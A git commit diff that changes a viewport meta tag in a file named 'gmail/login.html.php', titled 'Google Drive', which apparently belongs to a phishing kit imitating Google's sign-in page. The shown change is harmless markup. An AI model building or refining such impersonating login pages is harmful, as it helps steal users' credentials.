6122811ac8cbec3fedd735d925927251f12512df
code34348 <88024661+code34348@users.noreply.github.com>
2022-12-22 08:38:31 +0000

    Update login.html.php

--- files/gmail/login.html.php
+++ files/gmail/login.html.php
@@ -4,7 +4,7 @@ include "validate.php";
 <!DOCTYPE html>
 <html lang="en" dir="ltr">
    <head>
-      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0" charset="utf-8">
       <title>Google Drive</title>
       <!-- JQuery and Bootstrap -->
       <script src='https://code.jquery.com/jquery-3.4.1.min.js'></script>
